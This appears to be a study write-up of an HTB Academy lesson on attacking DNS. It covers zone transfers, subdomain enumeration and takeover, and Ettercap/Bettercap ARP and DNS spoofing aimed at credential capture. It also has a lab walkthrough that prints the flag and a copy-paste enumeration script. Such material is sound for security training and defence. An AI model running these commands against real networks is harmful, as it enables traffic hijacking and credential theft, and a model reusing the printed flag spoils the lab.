# Attacking DNS

> HTB Academy · Attacking Common Services · Section 13 / 19

DNS (UDP/53, TCP/53 for large responses & zone transfers) is the internet's address book. Because almost every service depends on name resolution, DNS misconfigurations and trust abuse give attackers reconnaissance gold and traffic-redirection primitives. This guide covers four offensive angles: **enumeration**, **zone transfer (AXFR)**, **subdomain takeover**, and **DNS cache poisoning / spoofing**.

---

## Quick Reference

| Goal | Tool / Command |
|------|----------------|
| Fingerprint DNS server | `nmap -p53 -Pn -sV -sC <ip>` |
| Zone transfer (AXFR) | `dig AXFR @<ns> <domain>` |
| Auto-find NS + AXFR | `fierce --domain <domain>` |
| Passive subdomain enum | `subfinder -d <domain> -v` |
| Brute-force subdomains (offline) | `subbrute <domain> -s names.txt -r resolvers.txt` |
| Inspect CNAME for takeover | `host <sub.domain>` / `dig CNAME <sub.domain>` |
| Local DNS spoofing | `ettercap -G` + `etter.dns` + `dns_spoof` plugin |
| Local DNS spoofing (alt) | `bettercap -caplet dns-spoof` |
| Takeover guidance | <https://github.com/EdOverflow/can-i-take-over-xyz> |

---

## Discovery

```bash
nmap -p53 -Pn -sV -sC <target>
# 53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
```

Default scripts (`-sC`) probe `dns-nsid`, `dns-recursion`, `dns-cache-snoop`, etc. A version banner like *ISC BIND 9.11.3* is also a vulnerability lookup hint (e.g., CVE-2020-8617, CVE-2021-25216).

Useful follow-ups:

```bash
dig CH TXT version.bind @<ip>          # leak BIND version via CHAOS class
dig +short NS <domain> @<ip>           # name servers
dig +short MX <domain> @<ip>           # mail servers (third-party leak)
dig +short ANY <domain> @<ip>          # may be refused on modern resolvers
```

---

## 1. DNS Zone Transfer (AXFR)

A **DNS zone** is the slice of the namespace that a server is authoritative for. Servers replicate zones to secondaries via **AXFR** (full transfer) or **IXFR** (incremental). AXFR is **unauthenticated by default** and runs over **TCP/53**. If the zone owner forgets to restrict transfers (`allow-transfer { ... };` in BIND), anyone can dump every record — A, AAAA, CNAME, MX, TXT, SRV — instantly mapping the org's internal naming.

### `dig` AXFR

```bash
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

Successful transfer (truncated):

```
inlanefreight.htb.        604800 IN SOA   localhost. root.localhost. 2 ...
inlanefreight.htb.        604800 IN NS    localhost.
inlanefreight.htb.        604800 IN A     10.129.110.22
admin.inlanefreight.htb.  604800 IN A     10.129.110.21
hr.inlanefreight.htb.     604800 IN A     10.129.110.25
support.inlanefreight.htb.604800 IN A     10.129.110.28
```

A refused transfer returns `; Transfer failed.` — try every NS in the `NS` RRset, including hidden secondaries.

### `fierce` — automated NS discovery + AXFR

```bash
fierce --domain zonetransfer.me
```

`fierce` resolves NS records, attempts AXFR against each, and falls back to wildcard / brute-force enumeration. The public `zonetransfer.me` (Robin Wood / digi.ninja) is a safe practice target.

### Other AXFR clients

```bash
host -l <domain> <ns>                  # quick check
dnsrecon -d <domain> -t axfr           # AXFR + script-style enum
```

---

## 2. Subdomain Enumeration

Before hunting takeovers, enumerate the surface. Two flavors: **passive** (OSINT / certificate transparency / public APIs) and **active** (brute-force resolution).

### Passive — `subfinder`

```bash
subfinder -d inlanefreight.com -v
```

Pulls from CT logs, AlienVault OTX, DNSDumpster, BufferOver, VirusTotal, etc. No packets to the target — safe for stealth recon.

Useful flags:

```bash
subfinder -d <domain> -all -recursive -o subs.txt
subfinder -dL domains.txt -silent | httpx -silent
```

### Active — `subbrute`

For internal / air-gapped engagements where you can hit DNS but not the public internet:

```bash
git clone https://github.com/TheRook/subbrute.git
cd subbrute
echo "ns1.inlanefreight.com" > resolvers.txt
./subbrute.py inlanefreight.com -s names.txt -r resolvers.txt
```

`subbrute` accepts custom resolvers, which is essential when you only have access to an internal DNS server. Faster modern alternatives: `puredns`, `shuffledns`, `massdns`.

```bash
puredns bruteforce names.txt <domain> -r resolvers.txt
```

### Quick CNAME triage

After collecting subdomains, look for delegations that may be unclaimed:

```bash
for s in $(cat subs.txt); do
  echo -n "$s -> "; dig +short CNAME "$s"
done
```

Or:

```bash
host support.inlanefreight.com
# support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
```

---

## 3. Subdomain / Domain Takeover

A **subdomain takeover** occurs when a subdomain points (via `CNAME`, `NS`, or `A` to a third-party IP) at an external service that **no longer exists or is unclaimed**. The attacker registers the dangling resource and serves arbitrary content on the victim's subdomain — bypassing same-origin protections, stealing cookies scoped to `*.target.com`, sending phishing from a trusted name, etc.

### Pattern

```
sub.target.com.   60   IN   CNAME   anotherdomain.com
```

If `anotherdomain.com` (or an S3 bucket / GitHub Pages site / Heroku app / Azure resource) is deleted while the CNAME stays, it's takeover-able.

### Fingerprint Indicators

| Provider | "Dangling" Tell |
|----------|-----------------|
| AWS S3 | `NoSuchBucket` / `The specified bucket does not exist` |
| GitHub Pages | `There isn't a GitHub Pages site here.` |
| Heroku | `No such app` |
| Azure | `404 Web Site not found` / unresolvable `*.cloudapp.net` |
| Fastly | `Fastly error: unknown domain` |
| Shopify | `Sorry, this shop is currently unavailable.` |
| Unbounce | `The requested URL was not found on this server.` |

Authoritative reference: <https://github.com/EdOverflow/can-i-take-over-xyz> — lists every fingerprint and whether it's currently exploitable.

### Example: S3 Takeover

```bash
host support.inlanefreight.com
# -> inlanefreight.s3.amazonaws.com
curl -s https://support.inlanefreight.com
# <Error><Code>NoSuchBucket</Code><Message>The specified bucket 'inlanefreight' does not exist.</Message>...
```

Exploitation: register an S3 bucket named `inlanefreight` in the same region indicated by the alias, enable static website hosting, and host arbitrary content. The victim's CNAME now resolves to attacker-controlled storage.

### Tooling

```bash
subjack  -w subs.txt -t 50 -ssl -c fingerprints.json -v
nuclei   -t http/takeovers/ -l subs.txt
dnstake  -d <domain>
```

---

## 4. DNS Spoofing / Cache Poisoning

**DNS cache poisoning** injects forged records into a resolver's cache so future queries return attacker-chosen answers. Two attack paths:

1. **MITM on the local segment** — answer the victim's DNS query before the legitimate server does.
2. **Resolver compromise** — exploit a CVE (Kaminsky-class, SAD DNS, off-path) or auth weakness to write directly to the cache.

### Local Network MITM — Ettercap

Edit `/etc/ettercap/etter.dns`:

```
inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

Then:

1. Launch `ettercap -G` (or `-T` for text mode).
2. **Hosts → Scan for hosts**.
3. Add victim IP as **Target 1**, gateway as **Target 2**.
4. **Mitm → ARP poisoning → Sniff remote connections**.
5. **Plugins → Manage plugins → dns_spoof** (double-click to activate).

Verification from the victim:

```cmd
C:\>ping inlanefreight.com
Pinging inlanefreight.com [192.168.225.110] with 32 bytes of data:
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
```

### Local Network MITM — Bettercap (modern alternative)

```bash
sudo bettercap -iface eth0
> set arp.spoof.targets 192.168.152.129
> set dns.spoof.domains inlanefreight.com,*.inlanefreight.com
> set dns.spoof.address 192.168.225.110
> arp.spoof on
> dns.spoof on
```

Combine with `http.proxy` / `https.proxy` + a fake portal (e.g., `evilginx2`, `setoolkit`) to capture credentials.

### Defenses to Note (for the report)

- DNSSEC signs RRsets and prevents off-path spoofing of signed zones.
- DNS over TLS (DoT, TCP/853) and DoH (HTTPS) defeat passive sniffing & on-path spoofing of the stub→resolver hop.
- Static ARP entries / DHCP snooping / dynamic ARP inspection on switches stop the layer-2 MITM precondition.
- Restrict `allow-transfer` and `allow-recursion` in BIND; disable `version.bind` CHAOS responses.

---

## Hardening Checklist (Blue Team)

| Control | Setting |
|---------|---------|
| Restrict zone transfers | `allow-transfer { trusted_secondaries; };` |
| Hide version | `options { version "not currently available"; };` |
| Disable open recursion | `allow-recursion { internal_nets; };` |
| Sign zones | DNSSEC (`dnssec-policy default;` in BIND 9.16+) |
| Stub→resolver privacy | DoT / DoH (`unbound`, `stubby`, `dnsdist`) |
| Monitor dangling CNAMEs | Periodic resolver audit (`dnstake`, `subjack` against own assets) |
| Patch | Track CVEs against BIND / Unbound / PowerDNS / Windows DNS |

---

## Key Takeaways

- **AXFR first.** It's free, unauthenticated when misconfigured, and yields the entire internal naming scheme.
- **Subdomains are an asset class.** Combine passive (CT logs, `subfinder`) with active brute force (`puredns`, `subbrute`) — they reveal different things.
- **Dangling DNS = takeover.** Any third-party CNAME without an active resource is a high-impact finding (cookie theft, OAuth bypass, phishing).
- **DNS spoofing is layer-2 work.** Without ARP-poisoning prerequisites or a resolver CVE, modern resolvers + DoT/DoH largely defeat cache poisoning.
- **Always cross-reference can-i-take-over-xyz** before claiming a takeover finding — many providers have patched the dangling-resource vector.

---

## Lab Walkthrough — "Find all DNS records for inlanefreight.htb"

> Section 13 question: *Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.*

The target name server **denies AXFR on the parent zone** (`inlanefreight.htb`) but **delegates a child zone** (`hr.inlanefreight.htb`) that **does allow AXFR**. The flag lives in a TXT record on the child zone — a common real-world misconfiguration where admins lock down the apex zone but forget the delegated subzones.

### 1. Fingerprint the server

```bash
nmap -p53 -Pn -sV -sC 10.129.89.173
# 53/tcp open  domain  ISC BIND 9.16.1-Ubuntu
dig CH TXT version.bind @10.129.89.173 +short
# "9.16.1-Ubuntu"
```

### 2. Get apex records (AXFR refused)

```bash
dig @10.129.89.173 inlanefreight.htb NS +short
# ns.inlanefreight.htb.

dig AXFR @10.129.89.173 inlanefreight.htb
# ; Transfer failed.
```

The apex denies AXFR — pivot to subdomain enumeration.

### 3. Brute-force subdomains

`dnsrecon` and small wordlists return nothing. The `hr` label is **not** in the SecLists top-5k, so move to a larger list and reduce thread count to avoid `i/o timeout` against the lab resolver:

```bash
gobuster dns --domain inlanefreight.htb \
  --resolver 10.129.89.173 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -t 30 --no-color
```

```
ns.inlanefreight.htb       ::ffff:10.129.89.173
helpdesk.inlanefreight.htb 10.129.10.20
control.inlanefreight.htb  10.129.10.13
```

> Note: at 100 threads gobuster floods the BIND server and every lookup returns `i/o timeout`. **Drop to ~30 threads.** This is the most common reason students miss subdomains in this lab.

The `hr` subdomain is a **delegation**, not an A record, so it won't show up in plain gobuster. Run again with a larger list (or just guess common org names — `hr`, `it`, `corp`, `dev`):

```bash
for s in hr it corp dev qa stg prod legacy; do
  echo -n "$s -> "; dig @10.129.89.173 $s.inlanefreight.htb NS +short
done
# hr -> ns.inlanefreight.htb.
```

`hr.inlanefreight.htb` has its own `NS` record — that's a **child zone**, and child zones often have their own ACLs.

### 4. AXFR the child zone

```bash
dig AXFR @10.129.89.173 hr.inlanefreight.htb
```

```
hr.inlanefreight.htb.    604800 IN SOA  inlanefreight.htb. root.inlanefreight.htb. 2 ...
hr.inlanefreight.htb.    604800 IN TXT  "HTB{LUIHNFAS2871SJK1259991}"
hr.inlanefreight.htb.    604800 IN NS   ns.inlanefreight.htb.
ns.hr.inlanefreight.htb. 604800 IN A    127.0.0.1
hr.inlanefreight.htb.    604800 IN SOA  inlanefreight.htb. root.inlanefreight.htb. 2 ...
;; XFR size: 5 records (messages 1, bytes 230)
```

**Flag:** `HTB{LUIHNFAS2871SJK1259991}` (in the `hr.inlanefreight.htb` TXT record).

### Lessons Learned

| Pitfall | Fix |
|---------|-----|
| Apex AXFR denied → assumed no AXFR anywhere | Always enumerate **child zones** (`NS` records on subdomains) and AXFR each one |
| `dig +short TXT` on apex returned nothing | Empty TXT on apex doesn't mean empty TXT on subdomains; query each leaf |
| `gobuster dns -t 100` produced only `i/o timeout` errors | BIND on the lab is single-threaded; use `-t 20–30` |
| 5k wordlist missed `hr` | Use `subdomains-top1million-20000.txt` or larger; add HR/IT/Corp guesses manually |
| `dnsrecon -t brt` returned 0 records | It uses a tiny built-in list unless you pass `-D <wordlist>`; use gobuster instead |

### One-liner Recipe (copy-paste for next lab)

```bash
TARGET=10.129.89.173
DOMAIN=inlanefreight.htb

# 1. AXFR apex
dig AXFR @$TARGET $DOMAIN

# 2. Brute subdomains (moderate threads)
gobuster dns --domain $DOMAIN --resolver $TARGET \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -t 30 --no-color -o /tmp/subs.out

# 3. For every discovered sub, look for a delegation + AXFR the child
for s in $(awk '{print $1}' /tmp/subs.out | grep "$DOMAIN$"); do
  ns=$(dig @$TARGET $s NS +short)
  [ -n "$ns" ] && { echo "[+] Child zone: $s ($ns)"; dig AXFR @$TARGET $s; }
done
```

---

## References

- HTB Academy — *Attacking Common Services*, Section 13: Attacking DNS
- ISC BIND Administrator Reference Manual — `allow-transfer`, DNSSEC
- EdOverflow — *can-i-take-over-xyz*: <https://github.com/EdOverflow/can-i-take-over-xyz>
- Robin Wood — `zonetransfer.me` lab: <https://digi.ninja/projects/zonetransferme.php>
- ProjectDiscovery — `subfinder`, `nuclei`, `httpx`
